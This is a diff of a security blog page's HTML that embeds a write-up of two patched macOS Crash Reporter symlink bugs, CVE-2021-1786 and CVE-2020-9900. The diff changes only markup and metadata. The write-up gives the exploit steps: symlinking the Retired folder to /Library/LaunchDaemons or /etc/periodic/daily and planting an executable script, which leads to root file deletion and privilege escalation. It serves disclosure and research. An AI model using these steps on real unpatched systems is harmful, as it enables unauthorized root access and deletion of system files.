@@ -17,8 +17,8 @@
 <meta property="og:description" content="I plan to discuss two symlink attacks in this blog post. The first, more severe one, CVE-2020-9900 was reported by Zhongcheng Li (CK01) of Zero-dayits Team of Legendsec at Qi&rsquo;anxin Group, and fixed in Catalina 10.15.6. Apple&rsquo;s advisory said that with a symlink attack it was possible to elevate privileges. I never saw a public document about this bug, so I only assume that I will describe the actual issue here." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://theevilbit.github.io/posts/macos_crashreporter/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2021-04-20T00:00:00&#43;00:00" />
-<meta property="article:modified_time" content="2021-04-20T00:00:00&#43;00:00" />
+<meta property="article:published_time" content="2021-04-20T00:00:00+00:00" />
+<meta property="article:modified_time" content="2021-04-20T00:00:00+00:00" />
 
 
 
@@ -54,7 +54,7 @@
     <link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-32x32.png" sizes="32x32">
     <link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-16x16.png" sizes="16x16">
 
-    <meta name="generator" content="Hugo 0.84.1" />
+    <meta name="generator" content="Hugo 0.89.2" />
   </head>
 
   <body class=" ">
@@ -143,14 +143,14 @@
 <h2 id="crash-reporter">Crash Reporter</h2>
 <p>Crash Reporter, collects various crash and other diagnostic logs in two locations, <code>/Library/Logs/DiagnosticReports</code> and <code>~/Library/Logs/DiagnosticReports</code> . The second is used more for apps, which run as the user.</p>
 <p>Interestingly, the default user id, which is in the <code>admin</code> group, is also member of the <code>_analyticsusers</code> group. This membership ultimately allows the user write and delete files in the <code>/Library/Logs/DiagnosticReports</code> directory.</p>
-<pre><code>csaby@bigsur ~ % ls -l /Library/Logs | grep Diag
+<pre tabindex="0"><code>csaby@bigsur ~ % ls -l /Library/Logs | grep Diag
 drwxrwx---  11 root  _analyticsusers   352 Apr 19 04:53 DiagnosticReports
 </code></pre><p>The crash reporter process, is called <code>SubmitDiagInfo</code> and it&rsquo;s located at  <code>/System/Library/CoreServices/SubmitDiagInfo</code>. This process runs as root, as we can see in the process list.</p>
-<pre><code>csaby@bigsur ~ % ps -je | grep Submit
+<pre tabindex="0"><code>csaby@bigsur ~ % ps -je | grep Submit
 root               468     1   468      0    0 Ss     ??    0:00.03 /System/Library/CoreServices/SubmitDiagInfo server-init
 </code></pre><p>The <code>SubmitDiagInfo</code> process retires old reports on a weekly basis and moves them into the <code>Retired</code> subfolder.  The process also cleans up the <code>Retired</code> subdirectory.</p>
 <p>As we have write access to both <code>/Library/Logs/DiagnosticReports</code> and <code>~/Library/Logs/DiagnosticReports</code> folders (either the global as an <code>_analyticsusers</code> user or the one in the user&rsquo;s home directory) , we can delete the existing <code>Retired</code> folder, and create a symlink pointing to the location of our choice.</p>
-<pre><code>csaby@bigsur DiagnosticReports % pwd
+<pre tabindex="0"><code>csaby@bigsur DiagnosticReports % pwd
 /Users/csaby/Library/Logs/DiagnosticReports
 
 csaby@bigsur DiagnosticReports % ln -s /Library/LaunchDaemons Retired
@@ -162,7 +162,7 @@ lrwxr-xr-x  1 csaby  staff  22 Apr 19 05:03 Retired -&gt; /Library/LaunchDaemons
 <p>Let&rsquo;s explore what we can do with that.</p>
 <h2 id="cve-2021-1786---arbitrary-file-deletion">CVE-2021-1786 - Arbitrary file deletion</h2>
 <p>It gives us some light arbitrary file deletion as root. We pointed our symlink to <code>/Library/LaunchDaemons</code>. This means that whatever is stored there will be cleaned up (deleted) on a weekly basis.</p>
-<pre><code>csaby@bigsur DiagnosticReports % ls -l /Library/LaunchDaemons 
+<pre tabindex="0"><code>csaby@bigsur DiagnosticReports % ls -l /Library/LaunchDaemons 
 total 8
 -r--r--r--  1 root  wheel  1156 Aug 10  2020 com.vmware.launchd.tools.plist
 </code></pre><p><code>SubmitDiagInfo</code> will only delete files older than one week. The file in my <code>/Library/LaunchDaemons</code> folder will satisfy this requirement, as it&rsquo;s a couple of months old.</p>
@@ -170,14 +170,14 @@ total 8
 <p><img src="https://media.giphy.com/media/tXL4FHPSnVJ0A/giphy.gif" alt="Waiting"></p>
 <p>Ok, a week passed. The impatience ones, like me can set their date to a week ahead to play along - of course you can&rsquo;t do this if not root, so in real life it doesn&rsquo;t count.</p>
 <p>Once the process starts cleanup, we can see that it will delete all files found in that directory, depending on its timestamp.</p>
-<pre><code>csaby@bigsur DiagnosticReports % log show --style syslog --predicate 'processImagePath CONTAINS[c] &quot;SubmitDiagInfo&quot; &amp;&amp; eventMessage CONTAINS[c] &quot;Removing&quot;' --last 2h
+<pre tabindex="0"><code>csaby@bigsur DiagnosticReports % log show --style syslog --predicate 'processImagePath CONTAINS[c] &quot;SubmitDiagInfo&quot; &amp;&amp; eventMessage CONTAINS[c] &quot;Removing&quot;' --last 2h
 Filtering the log data using &quot;processImagePath CONTAINS[c] &quot;SubmitDiagInfo&quot; AND composedMessage CONTAINS[c] &quot;Removing&quot;&quot;
 Skipping info and debug messages, pass --info and/or --debug to include.
 Timestamp                       (process)[PID]    
 2021-04-26 05:10:55.982396-0700  localhost SubmitDiagInfo[468]: (OSAnalytics) Removing old retired log '/Users/csaby/Library/Logs/DiagnosticReports/Retired/com.vmware.launchd.tools.plist'
 </code></pre><p>Yay! The file is deleted.</p>
 <p>Interestingly it detects the symlink, yet still follows it.</p>
-<pre><code>csaby@bigsur DiagnosticReports % log show --style syslog --predicate 'processImagePath CONTAINS[c] &quot;SubmitDiagInfo&quot; &amp;&amp; eventMessage CONTAINS[c] &quot;Symlink&quot;' --last 2h
+<pre tabindex="0"><code>csaby@bigsur DiagnosticReports % log show --style syslog --predicate 'processImagePath CONTAINS[c] &quot;SubmitDiagInfo&quot; &amp;&amp; eventMessage CONTAINS[c] &quot;Symlink&quot;' --last 2h
 Filtering the log data using &quot;processImagePath CONTAINS[c] &quot;SubmitDiagInfo&quot; AND composedMessage CONTAINS[c] &quot;Symlink&quot;&quot;
 Skipping info and debug messages, pass --info and/or --debug to include.
 Timestamp                       (process)[PID]    
@@ -185,7 +185,7 @@ Timestamp                       (process)[PID]
 </code></pre><p>Ok, so here we deleted a file as root with our user account. If you are here for privilege escalation, read on. And what is this symlink detection anyway?</p>
 <h2 id="cve-2020-9900---file-write-to-custom-location">CVE-2020-9900 - File write to custom location</h2>
 <p>This is where the first bugs comes into play, and the log entry about the symlink. If we go back to an earlier version of Catalina (e.g.: 10.15.4), we will find that similarly to file deletion, we can redirect file writes into custom location, when logs are retired from the <code>DiagnosticReports</code> directory. The symlink message is also gone.</p>
-<pre><code>csaby@dev ~ % log show --style syslog --predicate 'processImagePath CONTAINS[c] &quot;SubmitDiagInfo&quot; &amp;&amp; eventMessage CONTAINS[c] &quot;Analytics&quot;' --last 4h      
+<pre tabindex="0"><code>csaby@dev ~ % log show --style syslog --predicate 'processImagePath CONTAINS[c] &quot;SubmitDiagInfo&quot; &amp;&amp; eventMessage CONTAINS[c] &quot;Analytics&quot;' --last 4h      
 Filtering the log data using &quot;processImagePath CONTAINS[c] &quot;SubmitDiagInfo&quot; AND composedMessage CONTAINS[c] &quot;Analytics&quot;&quot;
 Skipping info and debug messages, pass --info and/or --debug to include.
 Timestamp                       (process)[PID]    
@@ -196,20 +196,20 @@ Timestamp                       (process)[PID]
 <p>Ok, so at this point we can move a file with a specific extension to an arbitrary location. What does it give us?</p>
 <h2 id="cve-2020-9900---local-privilege-escalation">CVE-2020-9900 - Local Privilege Escalation</h2>
 <p>The question is if there is any service on the system, which will happily execute a file for us with any extension. There is one (at least), the periodic script tasks. It runs as root, and will execute every script found in one of the following directories.</p>
-<pre><code>csaby@dev Logs % ls -l /etc/periodic 
+<pre tabindex="0"><code>csaby@dev Logs % ls -l /etc/periodic 
 total 0
 drwxr-xr-x  2 root  wheel   64 Apr 26 15:47 daily
 drwxr-xr-x  5 root  wheel  160 Aug 25  2019 monthly
 drwxr-xr-x  3 root  wheel   96 Apr 13  2020 weekly
 </code></pre><p>As the name suggests they run daily, weekly and monthly. The ultimate zen way is choosing the monthly and then you get root in 1 week + 1 month time. Here I will go for daily, which is still slow, but not that much.</p>
-<pre><code>csaby@dev DiagnosticReports % ln -s /etc/periodic/daily Retired
+<pre tabindex="0"><code>csaby@dev DiagnosticReports % ln -s /etc/periodic/daily Retired
 
 csaby@dev DiagnosticReports % echo /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal &gt; lpe.core_analytics
 
 csaby@dev DiagnosticReports % chmod +x lpe.core_analytics
 </code></pre><p>Here I recreate the symlink, and make a one liner bash script which will start Terminal.</p>
 <p>Once the log retirement happen our file will be moved.</p>
-<pre><code>csaby@dev DiagnosticReports % sudo ls -l /etc/periodic/daily
+<pre tabindex="0"><code>csaby@dev DiagnosticReports % sudo ls -l /etc/periodic/daily
 ...
 -rwxr-xr-x@ 1 csaby        _analyticsusers    23 Apr 18 11:35 lpe.core_analytics
 
@@ -220,12 +220,12 @@ csaby@dev DiagnosticReports % sudo periodic daily
 <h2 id="conclusion-credits">Conclusion, credits</h2>
 <p>As noted I&rsquo;m not 100% this is what CVE-2020-9900 was, but I have a strong guess. Maybe CX01 will correct me, and if so I will update this post. Also there might be a more efficient way exploiting it.</p>
 <p>Apple&rsquo;s advisory:</p>
-<pre><code>Available for: macOS Big Sur 11.0.1, macOS Catalina 10.15.7, and macOS Mojave 10.14.6
+<pre tabindex="0"><code>Available for: macOS Big Sur 11.0.1, macOS Catalina 10.15.7, and macOS Mojave 10.14.6
 Crash Reporter
 Impact: A local user may be able to create or modify system files
 Description: A logic issue was addressed with improved state management.
 CVE-2021-1786: Csaba Fitzl (@theevilbit) of Offensive Security
-</code></pre><pre><code>Available for: macOS Catalina 10.15.5
+</code></pre><pre tabindex="0"><code>Available for: macOS Catalina 10.15.5
 Crash Reporter
 Impact: A local attacker may be able to elevate their privileges
 Description: An issue existed within the path validation logic for symlinks. This issue was addressed with improved path sanitization.
